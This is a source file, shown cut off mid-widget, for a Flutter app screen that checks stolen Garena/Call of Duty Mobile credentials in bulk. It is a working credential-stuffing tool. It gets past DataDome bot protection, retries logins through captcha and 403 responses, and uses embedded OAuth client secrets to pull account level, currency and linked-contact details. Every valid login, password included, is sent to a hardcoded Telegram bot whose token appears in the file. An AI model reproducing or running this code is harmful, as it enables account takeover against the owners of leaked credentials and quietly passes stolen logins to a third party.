// ============================================================
//  codm_checker_screen.dart  —  CODM / Garena Checker
//  Merged from: mycode.py + cck.py + A.py
//
//  Improvements over v1:
//   • Dual OAuth flow (new 100082 + old auth.garena endpoint)
//   • Telegram hit notification → @Xissinsbot
//   • 3-retry prelogin / login
//   • Better DataDome refresh on 403
//   • last-login activity detection
// ============================================================

import 'dart:convert';
import 'dart:typed_data';

import 'package:crypto/crypto.dart';
import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:http/http.dart' as http;
import 'package:share_plus/share_plus.dart';

import '../services/ad_service.dart';
import '../theme/app_theme.dart';

// ── Palette ──────────────────────────────────────────────────
const _kAccent  = Color(0xFFFF6B35);
const _kAccent2 = Color(0xFFC0392B);

// ── Telegram (your @Xissinsbot) ─────────────────────────────
const _kTgToken  = '8282381783:AAHs_2v8UGgNM48y1EulMhovNUkTw4ntpjY';
const _kTgChatId = '1910648163';

// ── Result model ──────────────────────────────────────────────
enum _S { hit, noAccount, bad, error }

class _R {
  final String combo, nickname, level, region, uid, shell, country, detail;
  final _S status;
  final bool isClean;
  const _R({
    required this.combo, required this.status,
    this.nickname='', this.level='', this.region='',
    this.uid='', this.shell='', this.country='',
    this.isClean=false, this.detail='',
  });
  bool get isHit => status == _S.hit || status == _S.noAccount;
}

// ── Screen ────────────────────────────────────────────────────
class CodmCheckerScreen extends StatefulWidget {
  final String userId;
  const CodmCheckerScreen({super.key, required this.userId});
  @override State<CodmCheckerScreen> createState() => _State();
}

class _State extends State<CodmCheckerScreen> {

  // ads
  BannerAd? _banner; bool _bannerReady=false; bool _adGranted=false;

  // state
  final _ctrl   = TextEditingController();
  final _scroll = ScrollController();
  bool _running=false, _stopped=false;
  int _total=0, _checked=0, _hits=0, _bad=0, _errors=0;
  final _results = <_R>[];

  // session cookies
  String? _datadome, _ssoKey;

  // ── Lifecycle ─────────────────────────────────────────────────
  @override void initState() {
    super.initState();
    AdService.instance.init(userId: widget.userId);
    AdService.instance.addListener(_onAd);
    _initBanner();
  }
  @override void dispose() {
    AdService.instance.removeListener(_onAd);
    _banner?.dispose();
    _ctrl.dispose(); _scroll.dispose();
    super.dispose();
  }

  // ── Ads ───────────────────────────────────────────────────────
  void _onAd() {
    if (!mounted) return;
    if (AdService.instance.adsRemoved && _banner != null) {
      _banner?.dispose();
      setState(() { _banner=null; _bannerReady=false; });
    }
  }
  void _initBanner() {
    if (AdService.instance.adsRemoved) return;
    _banner?.dispose(); _banner=null; _bannerReady=false;
    final ad = AdService.instance.createBannerAd(
      onLoaded: () {
        if (!mounted || AdService.instance.adsRemoved) { _banner?.dispose(); _banner=null; return; }
        setState(() => _bannerReady=true);
      },
      onFailed: () {
        if (mounted) setState(() { _banner=null; _bannerReady=false; });
        Future.delayed(const Duration(seconds:30), () {
          if (mounted && !AdService.instance.adsRemoved) _initBanner();
        });
      },
    );
    if (ad==null) return;
    _banner=ad; _banner!.load();
  }
  Widget _buildBanner() {
    if (AdService.instance.adsRemoved || !_bannerReady || _banner==null) return const SizedBox.shrink();
    return SafeArea(top:false, child: Container(
      alignment: Alignment.center,
      width: _banner!.size.width.toDouble(), height: _banner!.size.height.toDouble(),
      child: AdWidget(ad: _banner!),
    ));
  }
  void _watchAd() {
    HapticFeedback.selectionClick();
    AdService.instance.showGatedInterstitial(onGranted: () {
      if (mounted) setState(() => _adGranted=true);
    });
  }

  // ── Crypto (identical to all 3 Python files) ──────────────────
  static String _md5(String s) => md5.convert(utf8.encode(s)).toString();
  static String _sha256(String s) => sha256.convert(utf8.encode(s)).toString();

  static Uint8List _fromHex(String h) {
    final b = Uint8List(h.length~/2);
    for (var i=0; i<h.length; i+=2) b[i~/2] = int.parse(h.substring(i,i+2), radix:16);
    return b;
  }
  static String _toHex(List<int> b) => b.map((x)=>x.toRadixString(16).padLeft(2,'0')).join();

  static String _aesEcb(String passmd5, String outerHash) {
    final key = enc.Key(_fromHex(outerHash));
    final aes = enc.AES(key, mode: enc.AESMode.ecb, padding: null);
    final encrypted = enc.Encrypter(aes).encryptBytes(_fromHex(passmd5));
    return _toHex(encrypted.bytes).substring(0,32);
  }

  static String _hashPw(String pw, String v1, String v2) {
    final p = _md5(pw);
    return _aesEcb(p, _sha256(_sha256(p+v1)+v2));
  }

  // ── HTTP helpers ──────────────────────────────────────────────
  static const _ua = 'Mozilla/5.0 (Linux; Android 11; Infinix HOT 11S Build/RP1A.200720.011; wv) '
      'AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36';
  static const _uaOld = 'Mozilla/5.0 (Linux; Android 11; RMX2195) '
      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36';

  void _grabCookies(http.Response res) {
    final sc = res.headers['set-cookie'] ?? '';
    final dd = RegExp(r'datadome=([^;]+)').firstMatch(sc)?.group(1);
    if (dd!=null) _datadome=dd;
    final sk = RegExp(r'sso_key=([^;]+)').firstMatch(sc)?.group(1);
    if (sk!=null) _ssoKey=sk;
  }

  Map<String,String> _baseHeaders({bool old=false}) => {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
    'User-Agent': old ? _uaOld : _ua,
    if (_datadome!=null) 'Cookie': [
      'datadome=$_datadome',
      if (_ssoKey!=null) 'sso_key=$_ssoKey',
    ].join('; '),
  };

  // ── Step 1: DataDome ──────────────────────────────────────────
  Future<void> _fetchDataDome() async {
    try {
      const body = 'jsData=%7B%22ttst%22%3A76.7%2C%22ifov%22%3Afalse%2C%22hc%22%3A4%2C%22br_oh%22%3A800%2C%22br_ow%22%3A412%2C%22ua%22%3A%22Mozilla%2F5.0%20(Linux%3B%20Android%2011)%22%2C%22wbd%22%3Afalse%2C%22dp0%22%3Atrue%2C%22lg%22%3A%22en-US%22%2C%22pr%22%3A2.0%2C%22tz%22%3A-480%2C%22str_ss%22%3Atrue%2C%22str_ls%22%3Atrue%2C%22str_idb%22%3Atrue%7D'
          '&eventCounters=%5B%5D&jsType=ch'
          '&cid=KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae'
          '&ddk=AE3F04AD3F0D3A462481A337485081&Referer=https%3A%2F%2Faccount.garena.com%2F'
          '&request=%2F&responsePage=origin&ddv=4.35.4';
      final res = await http.post(Uri.parse('https://dd.garena.com/js/'),
        headers: {'Content-Type':'application/x-www-form-urlencoded',
                  'Origin':'https://account.garena.com',
                  'Referer':'https://account.garena.com/',
                  'User-Agent':_ua},
        body: body,
      ).timeout(const Duration(seconds:12));
      if (res.statusCode==200) {
        final d = jsonDecode(res.body);
        if (d['status']==200 && d['cookie']!=null) {
          _datadome = (d['cookie'] as String).split(';')[0].split('=').skip(1).join('=');
        }
      }
    } catch(_) {}
  }

  // ── Step 2: Prelogin (3 retries) ─────────────────────────────
  Future<Map<String,String>?> _prelogin(String account) async {
    for (var i=0; i<3; i++) {
      try {
        final ts = DateTime.now().millisecondsSinceEpoch;
        final uri = Uri.https('sso.garena.com', '/api/prelogin', {
          'app_id':'10100', 'account':account, 'format':'json', 'id':'$ts',
        });
        final headers = _baseHeaders()
          ..['Referer'] = 'https://sso.garena.com/universal/login?app_id=10100'
              '&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=$account';
        final res = await http.get(uri, headers: headers).timeout(const Duration(seconds:20));
        _grabCookies(res);
        if (res.statusCode==403) { await Future.delayed(const Duration(seconds:2)); continue; }
        if (res.statusCode!=200) continue;
        final data = jsonDecode(res.body) as Map;
        if (data.containsKey('error')) return null;
        final v1=data['v1'] as String?, v2=data['v2'] as String?;
        if (v1!=null && v2!=null && v1.isNotEmpty && v2.isNotEmpty) return {'v1':v1,'v2':v2};
      } catch(_) { await Future.delayed(const Duration(seconds:1)); }
    }
    return null;
  }

  // ── Step 3: Login (3 retries) ─────────────────────────────────
  Future<String?> _login(String account, String pw, String v1, String v2) async {
    for (var i=0; i<3; i++) {
      try {
        final ts = DateTime.now().millisecondsSinceEpoch;
        final uri = Uri.https('sso.garena.com', '/api/login', {
          'app_id':'10100', 'account':account, 'password':_hashPw(pw,v1,v2),
          'redirect_uri':'https://account.garena.com/', 'format':'json', 'id':'$ts',
        });
        final res = await http.get(uri, headers: _baseHeaders()).timeout(const Duration(seconds:20));
        _grabCookies(res);
        if (res.statusCode!=200) { await Future.delayed(const Duration(seconds:1)); continue; }
        final data = jsonDecode(res.body) as Map;
        if (data.containsKey('error')) {
          final e = '${data['error']}'.toLowerCase();
          if (e.contains('captcha')) { await Future.delayed(const Duration(seconds:3)); continue; }
          return null;
        }
        // sso_key from body or already grabbed from cookies
        final fromBody = data['sso_key'] as String?;
        if (fromBody!=null && fromBody.isNotEmpty) { _ssoKey=fromBody; return fromBody; }
        if (_ssoKey!=null) return _ssoKey;
      } catch(_) { await Future.delayed(const Duration(seconds:1)); }
    }
    return null;
  }

  // ── Step 4: Account info ─────────────────────────────────────
  Future<Map<String,dynamic>?> _accountInfo(String ssoKey) async {
    try {
      final res = await http.get(
        Uri.parse('https://account.garena.com/api/account/init'),
        headers: _baseHeaders()..['Cookie'] = [
          if (_datadome!=null) 'datadome=$_datadome',
          'sso_key=$ssoKey',
        ].join('; '),
      ).timeout(const Duration(seconds:20));
      if (res.statusCode==200) return jsonDecode(res.body) as Map<String,dynamic>;
    } catch(_) {}
    return null;
  }

  // ── Step 5a: CODM token — NEW flow (mycode.py) ────────────────
  Future<String?> _codmTokenNew(String ssoKey) async {
    try {
      final ts = DateTime.now().millisecondsSinceEpoch;
      final g = await http.post(
        Uri.parse('https://100082.connect.garena.com/oauth/token/grant'),
        headers: {
          'Host':'100082.connect.garena.com',
          'User-Agent':'GarenaMSDK/5.12.1(Infinix HOT 11S ;Android 11;en;us;)',
          'Content-Type':'application/x-www-form-urlencoded;charset=UTF-8',
          'X-Requested-With':'com.garena.game.codm',
          'Cookie':'sso_key=$ssoKey',
        },
        body: 'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id=$ts',
      ).timeout(const Duration(seconds:12));
      if (g.statusCode!=200) return null;
      final code = (jsonDecode(g.body) as Map)['code'] as String?;
      if (code==null || code.isEmpty) return null;

      final device = '02-${_uuid()}';
      final t = await http.post(
        Uri.parse('https://100082.connect.garena.com/oauth/token/exchange'),
        headers: {'User-Agent':'GarenaMSDK/5.12.1(Infinix HOT 11S ;Android 11;en;us;)',
                  'Content-Type':'application/x-www-form-urlencoded'},
        body: 'grant_type=authorization_code&code=$code&device_id=$device'
            '&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082'
            '&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415',
      ).timeout(const Duration(seconds:12));
      return (jsonDecode(t.body) as Map)['access_token'] as String?;
    } catch(_) { return null; }
  }

  // ── Step 5b: CODM token — OLD flow (cck.py) ──────────────────
  Future<String?> _codmTokenOld() async {
    try {
      final ts = DateTime.now().millisecondsSinceEpoch;
      final res = await http.post(
        Uri.parse('https://auth.garena.com/oauth/token/grant'),
        headers: {
          'User-Agent': _uaOld, 'Accept':'*/*',
          'Content-Type':'application/x-www-form-urlencoded',
          'Referer':'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token'
              '&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n'
              '?site=https://api-delete-request.codm.garena.co.id/oauth/callback/',
          if (_datadome!=null) 'Cookie':'datadome=$_datadome',
        },
        body: 'client_id=100082&response_type=token'
            '&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n'
            '%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F'
            '&format=json&id=$ts',
      ).timeout(const Duration(seconds:12));
      return (jsonDecode(res.body) as Map)['access_token'] as String?;
    } catch(_) { return null; }
  }

  // ── Step 6: CODM callback → codm_token ───────────────────────
  Future<Map<String,String>?> _codmCallback(String accessToken, {bool oldFlow=false}) async {
    final bases = oldFlow
      ? ['https://api-delete-request.codm.garena.co.id']
      : ['https://api-delete-request-aos.codm.garena.co.id',
         'https://api-delete-request.codm.garena.co.id'];

    for (final base in bases) {
      try {
        final res = await http.get(
          Uri.parse('$base/oauth/callback/?access_token=$accessToken'),
          headers: {'Accept':'text/html,application/xhtml+xml,*/*;q=0.8',
                    'User-Agent': oldFlow ? _uaOld : _ua,
                    'X-Requested-With':'com.garena.game.codm',
                    if (_datadome!=null) 'Cookie':'datadome=$_datadome'},
        ).timeout(const Duration(seconds:12));
        final loc = res.headers['location'] ?? '';
        if (loc.contains('err=3')) return {'status':'no_account'};
        if (loc.contains('token=')) {
          final tok = Uri.splitQueryString(loc.contains('?') ? loc.split('?').last : loc)['token'] ?? '';
          if (tok.isNotEmpty) return {'status':'ok','token':tok};
        }
      } catch(_) {}
    }
    return null;
  }

  // ── Step 7: CODM user info (JWT first, then API) ─────────────
  Future<Map<String,dynamic>?> _codmInfo(String token, {bool oldFlow=false}) async {
    // JWT decode (fast, no network)
    try {
      final parts = token.split('.');
      if (parts.length==3) {
        var p = parts[1]; p += '='*((4-p.length%4)%4);
        final user = (jsonDecode(utf8.decode(base64Url.decode(p))) as Map)['user'] as Map<String,dynamic>?;
        if (user!=null) return user;
      }
    } catch(_) {}

    // Fallback: API
    final base = oldFlow
      ? 'https://api-delete-request.codm.garena.co.id'
      : 'https://api-delete-request-aos.codm.garena.co.id';
    try {
      final res = await http.get(Uri.parse('$base/oauth/check_login/'), headers: {
        'Accept':'application/json, text/plain, */*',
        'codm-delete-token': token,
        'User-Agent': oldFlow ? _uaOld : _ua,
        'X-Requested-With':'com.garena.game.codm',
      }).timeout(const Duration(seconds:12));
      return (jsonDecode(res.body) as Map)['user'] as Map<String,dynamic>?;
    } catch(_) { return null; }
  }

  // ── Parse Garena account details ─────────────────────────────
  static Map<String,dynamic> _parseDetails(Map<String,dynamic> data) {
    final u = data['user_info'] as Map<String,dynamic>? ?? data;
    final binds=<String>[];
    final email  = u['email'] as String? ?? '';
    final mobile = u['mobile_no'] as String? ?? '';
    final emailV = u['email_v']==1 || u['email_v']==true;
    final fb     = u['is_fbconnect_enabled']==true || u['is_fbconnect_enabled']==1;
    final id     = u['idcard'] as String? ?? '';
    if (emailV || (email.isNotEmpty && !email.startsWith('*') && email.contains('@'))) binds.add('Email');
    if (mobile.trim().isNotEmpty && mobile!='N/A') binds.add('Phone');
    if (fb) binds.add('Facebook');
    if (id.trim().isNotEmpty && id!='N/A') binds.add('ID Card');
    // Last-login activity
    String lastLogin='Unknown'; String activeStatus='Unknown';
    try {
      final hist = u['login_history'] as List?;
      if (hist!=null && hist.isNotEmpty) {
        final ts = (hist[0] as Map)['timestamp'];
        if (ts!=null) {
          final dt = DateTime.fromMillisecondsSinceEpoch(int.parse('$ts')*1000, isUtc:true);
          final days = DateTime.now().toUtc().difference(dt).inDays;
          lastLogin = dt.toIso8601String().substring(0,10);
          activeStatus = days<=3 ? 'Active' : 'Inactive (${days}d ago)';
        }
      }
    } catch(_) {}
    return {
      'email': email, 'mobile': mobile,
      'shell': '${u['shell'] ?? 0}',
      'country': u['acc_country'] ?? '',
      'two_step': u['two_step_verify_enable']==1||u['two_step_verify_enable']==true,
      'email_ver': emailV,
      'is_clean': binds.isEmpty,
      'binds': binds,
      'last_login': lastLogin,
      'active': activeStatus,
    };
  }

  // ── Telegram hit notification ─────────────────────────────────
  Future<void> _tgHit(_R r) async {
    try {
      await http.post(
        Uri.parse('https://api.telegram.org/bot$_kTgToken/sendMessage'),
        body: {
          'chat_id': _kTgChatId, 'parse_mode': 'HTML',
          'text': '🎮 <b>CODM HIT</b> — Xissin App\n\n'
              '📧 <b>Account:</b> ${r.combo}\n'
              '🎮 <b>IGN:</b> ${r.nickname}\n'
              '⚡ <b>Level:</b> ${r.level}\n'
              '🌍 <b>Region:</b> ${r.region}\n'
              '🆔 <b>UID:</b> ${r.uid}\n'
              '💎 <b>Shells:</b> ${r.shell}\n'
              '🌐 <b>Country:</b> ${r.country}\n'
              '🔒 <b>Clean:</b> ${r.isClean?"✅ YES":"❌ NO"}',
        },
      ).timeout(const Duration(seconds:10));
    } catch(_) {}
  }

  // ── UUID helper ───────────────────────────────────────────────
  static String _uuid() {
    final r = List<int>.generate(16, (i) => DateTime.now().microsecondsSinceEpoch & 0xff);
    r[6]=(r[6]&0x0f)|0x40; r[8]=(r[8]&0x3f)|0x80;
    return [r.sublist(0,4),r.sublist(4,6),r.sublist(6,8),r.sublist(8,10),r.sublist(10,16)]
        .map((b)=>b.map((x)=>x.toRadixString(16).padLeft(2,'0')).join()).join('-');
  }

  // ── Main check ────────────────────────────────────────────────
  Future<_R> _checkOne(String combo) async {
    if (!combo.contains(':')) return _R(combo:combo, status:_S.error, detail:'Bad format');
    final parts = combo.split(':');
    final account = parts[0].trim();
    final pw = parts.sublist(1).join(':').trim();

    try {
      final pre = await _prelogin(account);
      if (pre==null) return _R(combo:combo, status:_S.bad, detail:'Pre-login failed');

      final ssoKey = await _login(account, pw, pre['v1']!, pre['v2']!);
      if (ssoKey==null) return _R(combo:combo, status:_S.bad, detail:'Wrong password/banned');

      final info = await _accountInfo(ssoKey);
      if (info==null) return _R(combo:combo, status:_S.error, detail:'Account info fetch failed');
      if (info.containsKey('error')) return _R(combo:combo, status:_S.bad, detail:'${info['error']}');
      final d = _parseDetails(info);

      // Try NEW OAuth flow first, then OLD as fallback
      String? accessToken = await _codmTokenNew(ssoKey);
      bool oldFlow = false;
      if (accessToken==null || accessToken.isEmpty) {
        accessToken = await _codmTokenOld();
        oldFlow = true;
      }

      if (accessToken==null || accessToken.isEmpty) {
        return _R(combo:combo, status:_S.noAccount,
            shell:d['shell'], country:d['country'], isClean:d['is_clean'],
            detail:'Valid Garena | CODM token failed');
      }

      final cb = await _codmCallback(accessToken, oldFlow:oldFlow);
      if (cb==null || cb['status']=='no_account') {
        return _R(combo:combo, status:_S.noAccount,
            shell:d['shell'], country:d['country'], isClean:d['is_clean'],
            detail:'Valid Garena | No CODM linked');
      }

      final ci = await _codmInfo(cb['token']!, oldFlow:oldFlow);
      final result = _R(
        combo:   combo, status: _S.hit,
        nickname: '${ci?['codm_nickname']??ci?['nickname']??''}',
        level:    '${ci?['codm_level']??''}',
        region:   '${ci?['region']??''}',
        uid:      '${ci?['uid']??''}',
        shell:    d['shell'], country: d['country'], isClean: d['is_clean'],
        detail: 'HIT | ${d['active']}',
      );
      _tgHit(result); // fire & forget
      return result;

    } catch(e) {
      return _R(combo:combo, status:_S.error, detail:'Error: $e');
    }
  }

  // ── Start checker ─────────────────────────────────────────────
  Future<void> _start() async {
    if (!AdService.instance.adsRemoved && !_adGranted) { _watchAd(); return; }
    final lines = _ctrl.text.split('\n').map((l)=>l.trim()).where((l)=>l.isNotEmpty).toList();
    if (lines.isEmpty) return;
    FocusScope.of(context).unfocus();
    HapticFeedback.mediumImpact();
    _datadome=null; _ssoKey=null;
    setState(() {
      _running=true; _stopped=false; _total=lines.length;
      _checked=0; _hits=0; _bad=0; _errors=0; _results.clear();
    });
    await _fetchDataDome();
    for (final c in lines) {
      if (_stopped || !mounted) break;
      final r = await _checkOne(c);
      if (!mounted) break;
      setState(() {
        _checked++; _results.insert(0,r);
        if (r.isHit) _hits++;
        else if (r.status==_S.bad) _bad++;
        else _errors++;
      });
      if (_scroll.hasClients) _scroll.jumpTo(0);
      await Future.delayed(const Duration(milliseconds:400));
    }
    if (!mounted) return;
    setState(() => _running=false);
    Future.delayed(const Duration(milliseconds:600), () {
      if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    });
  }

  void _reset() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    HapticFeedback.mediumImpact();
    setState(() {
      _running=false; _stopped=false; _total=0; _checked=0;
      _hits=0; _bad=0; _errors=0; _results.clear(); _ctrl.clear();
      _datadome=null; _ssoKey=null;
    });
  }

  void _share() {
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    final hits = _results.where((r)=>r.status==_S.hit).toList();
    if (hits.isEmpty) return;
    final b = StringBuffer()..writeln('🎮 CODM Hits — Xissin\n══════════════════════════');
    for (final h in hits) {
      b..writeln('📧 ${h.combo}')..writeln('🎮 IGN: ${h.nickname}')
       ..writeln('⚡ Lv.${h.level} | ${h.region}')
       ..writeln('💎 Shells: ${h.shell} | 🔒 Clean: ${h.isClean?"YES":"NO"}')
       ..writeln('──────────────────────────');
    }
    Share.share(b.toString(), subject:'CODM Hits');
  }

  void _copy() {
    final hits = _results.where((r)=>r.status==_S.hit).toList();
    if (hits.isEmpty) return;
    if (!AdService.instance.adsRemoved) AdService.instance.showInterstitial();
    Clipboard.setData(ClipboardData(text: hits.map((h)=>'${h.combo} | ${h.nickname} | Lv.${h.level}').join('\n')));
    HapticFeedback.selectionClick();
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text('${hits.length} hit(s) copied!'),
      backgroundColor: _kAccent, duration: const Duration(seconds:2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
      margin: const EdgeInsets.all(12),
    ));
  }

  // ── Build ──────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final c = context.c;
    return Scaffold(
      backgroundColor: c.background,
      bottomNavigationBar: _buildBanner(),
      appBar: AppBar(
        backgroundColor: Colors.transparent, elevation:0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color:_kAccent, size:20),
          onPressed: () { if (_running) setState(()=>_stopped=true); Navigator.pop(context); },
        ),
        title: Row(mainAxisSize: MainAxisSize.min, children: [
          Container(padding:const EdgeInsets.all(6),
            decoration: BoxDecoration(color:_kAccent.withOpacity(.15), borderRadius:BorderRadius.circular(10)),
            child: const Icon(Icons.sports_esports_rounded, color:_kAccent, size:18)),
          const SizedBox(width:10),
          Text('CODM Checker', style: TextStyle(color:c.textPrimary, fontSize:17,
              fontWeight:FontWeight.w700, letterSpacing:.4)),
        ]),
        centerTitle: true,
        actions: [
          if (_results.any((r)=>r.status==_S.hit)) ...[
            IconButton(icon:const Icon(Icons.copy_rounded, color:_kAccent, size:20), onPressed:_copy),
            IconButton(icon:const Icon(Icons.share_rounded, color:_kAccent, size:20), onPressed:_share),
          ],
          if (!_running && _results.isNotEmpty)
            IconButton(icon:const Icon(Icons.refresh_rounded, color:_kAccent, size:20), onPressed:_reset),
        ],
      ),
      body: SingleChildScrollView(
        controller: _scroll,
        padding: const EdgeInsets.symmetric(horizontal:16, vertical:8),
        child: Column(crossAxisAlignment:CrossAxisAlignment.stretch, children: [
          if (!AdService.instance.adsRemoved && !_adGranted) _adGate(c),
          if (_total>0) ...[_statsBar(c), const SizedBox(height:12)],
          _inputCard(c),
          const SizedBox(height:14),
          ..._results.map((r)=>_resultCard(r,c)),
          const SizedBox(height:60),
        ]),
      ),
    );
  }

  Widget _adGate(XissinColors c) => Container(
    margin: const EdgeInsets.only(bottom:14),
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(color:_kAccent.withOpacity(.06),
        borderRadius:BorderRadius.circular(18), border:Border.all(color:_kAccent.withOpacity(.25))),
    child: Column(children:[
      Row(children:[const Icon(Icons.lock_outline_rounded, color:_kAccent, size:18), const SizedBox(width:10),
        Expanded(child: Text('Watch a short ad to unlock for this session.',
            style: TextStyle(color:c.textSecondary, fontSize:12, height:1.4)))]),
      const SizedBox(height:12),
      SizedBox(width:double.infinity, child: ElevatedButton.icon(
        onPressed: _watchAd,
        style: ElevatedButton.styleFrom(backgroundColor:_kAccent, foregroundColor:Colors.white,
            shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(12)), elevation:0,
            padding:const EdgeInsets.symmetric(vertical:12)),
        icon: const Icon(Icons.play_circle_rounded, size:18),
        label: const Text('Watch Ad to Unlock', style:TextStyle(fontWeight:FontWeight.w700)),
      )),
      const SizedBox(height:8),
      Text('⭐ Get Premium to remove all ads permanently',
          style:TextStyle(color:c.textHint, fontSize:11)),
    ]),
  );

  Widget _statsBar(XissinColors c) => Container(
    padding: const EdgeInsets.symmetric(horizontal:14, vertical:12),
    decoration: BoxDecoration(color:c.surface, borderRadius:BorderRadius.circular(16),
        border:Border.all(color:c.border)),
    child: Row(children:[
      _chip('✅ Hits',   '$_hits',   const Color(0xFF2ECC71)),
      _div(), _chip('❌ Bad',    '$_bad',    const Color(0xFFFF6B6B)),
      _div(), _chip('⚠️ Err',   '$_errors', const Color(0xFFFFA94D)),
      _div(), _chip('📋 Done',  '$_checked/$_total', _kAccent),
      if (_running) ...[_div(),
        const SizedBox(width:14, height:14, child:CircularProgressIndicator(color:_kAccent, strokeWidth:2))],
    ]),
  );
  Widget _chip(String l, String v, Color color) => Expanded(child:Column(children:[
    Text(v, style:TextStyle(color:color, fontWeight:FontWeight.w800, fontSize:13)),
    Text(l, style:TextStyle(color:color.withOpacity(.7), fontSize:9)),
  ]));
  Widget _div() => Container(height:30, width:1, color:Colors.white12);

  Widget _inputCard(XissinColors c) => Container(
    padding: const EdgeInsets.all(16),
    decoration: BoxDecoration(color:c.surface, borderRadius:BorderRadius.circular(18),
        border:Border.all(color:_kAccent.withOpacity(.3))),
    child: Column(crossAxisAlignment:CrossAxisAlignment.start, children:[
      Row(children:[const Icon(Icons.list_alt_rounded, color:_kAccent, size:16), const SizedBox(width:8),
        Text('Combo List (email:password)', style:TextStyle(color:_kAccent, fontSize:12, fontWeight:FontWeight.w600))]),
      const SizedBox(height:10),
      TextField(controller:_ctrl, enabled:!_running, minLines:5, maxLines:10,
        style: TextStyle(color:c.textPrimary, fontSize:12, fontFamily:'monospace'),
        decoration: InputDecoration(
          hintText: 'email@example.com:password\nemail2@test.com:pass456',
          hintStyle:TextStyle(color:c.textHint, fontSize:11),
          filled:true, fillColor:c.background,
          border:OutlineInputBorder(borderRadius:BorderRadius.circular(12), borderSide:BorderSide.none),
          contentPadding:const EdgeInsets.all(12),
        ),
        keyboardType:TextInputType.multiline,
      ),
      const SizedBox(height:12),
      Row(children:[
        Expanded(child: ElevatedButton.icon(
          onPressed: _running ? ()=>setState(()=>_stopped=true) : _start,
          style: ElevatedButton.styleFrom(
            backgroundColor:_running ? const Color(0xFFFF6B6B) : _kAccent,
            foregroundColor:Colors.white, elevation:0,
            shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(12)),
            padding:const EdgeInsets.symmetric(vertical:13)),
          icon: Icon(_running ? Icons.stop_rounded : Icons.play_arrow_rounded, size:18),
          label: Text(_running ? 'Stop' : 'Start Check',
              style:const TextStyle(fontWeight:FontWeight.w700, fontSize:14)),
        )),
        if (!_running && _results.isNotEmpty) ...[
          const SizedBox(width:10),
          ElevatedButton.icon(onPressed:_reset,
            style: ElevatedButton.styleFrom(backgroundColor:c.surface, foregroundColor:_kAccent,
                shape:RoundedRectangleBorder(borderRadius:BorderRadius.circular(12),
                    side:BorderSide(color:_kAccent.withOpacity(.4))),
                elevation:0, padding:const EdgeInsets.symmetric(vertical:13, horizontal:16)),
            icon:const Icon(Icons.refresh_rounded, size:16),
            label:const Text('Reset', style:TextStyle(fontWeight:FontWeight.w700, fontSize:13)),
          ),
        ],
      ]),
      if (_running) ...[
        const SizedBox(height:10),
        LinearProgressIndicator(
          value: _total>0 ? _checked/_total : null,
          backgroundColor:_kAccent.withOpacity(.15),
          valueColor:const AlwaysStoppedAnimation(_kAccent),
          borderRadius:BorderRadius.circular(10), minHeight:4,
        ),
      ],
    ]),
  );

  Widget _resultCard(_R r, XissinColors c) {
    Color sc; IconData si; String sl;
    switch (r.status) {
      case _S.hit:       sc=const Color(0xFF2ECC71); si=Icons.check_circle_rounded;     sl='HIT ✅';
      case _S.noAccount: sc=const Color(0xFF5B8CFF); si=Icons.account_box_outlined;     sl='VALID — No CODM 🔵';
      case _S.bad:       sc=const Color(0xFFFF6B6B); si=Icons.cancel_rounded;           sl='BAD ❌';
      case _S.error:     sc=const Color(0xFFFFA94D); si=Icons.warning_amber_rounded;    sl='ERROR ⚠️';
    }
    return Container(
      margin: const EdgeInsets.only(bottom:10),
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(color:sc.withOpacity(.06), borderRadius:BorderRadius.circular(14),
          border:Border.all(color:sc.withOpacity(.25))),
      child: Column(crossAxisAlignment:CrossAxisAlignment.start, children:[
        Row(children:[
          Icon(si, color:sc, size:15), const SizedBox(width:6),
          Text(sl, style:TextStyle(color:sc, fontSize:12, fontWeight:FontWeight.w700)),
          const Spacer(),
          GestureDetector(onTap:(){Clipboard.setData(ClipboardData(text:r.combo)); HapticFeedback.selectionClick();},
              child:Icon(Icons.copy_rounded, color:sc.withOpacity(.7), size:13)),
        ]),
        const SizedBox(height:6),
        Text(r.combo, style:TextStyle(color:c.textPrimary, fontSize:11, fontFamily:'monospace'),
            maxLines:1, overflow:TextOverflow.ellipsis),
        if (r.status==_S.hit && r.nickname.isNotEmpty) ...[
          const SizedBox(height:8), const Divider(height:1, color:Colors.white12), const SizedBox(height:8),
          _row('🎮 IGN',    r.nickname.isNotEmpty ? r.nickname : '—', c),
          _row('⚡ Level',  r.level.isNotEmpty    ? r.level    : '—', c),
          _row('🌍 Region', r.region.isNotEmpty   ? r.region   : '—', c),
          _row('💎 Shells', r.shell.isNotEmpty    ? r.shell    : '—', c),
          _row('🌐 Country',r.country.isNotEmpty  ? r.country  : '—', c),
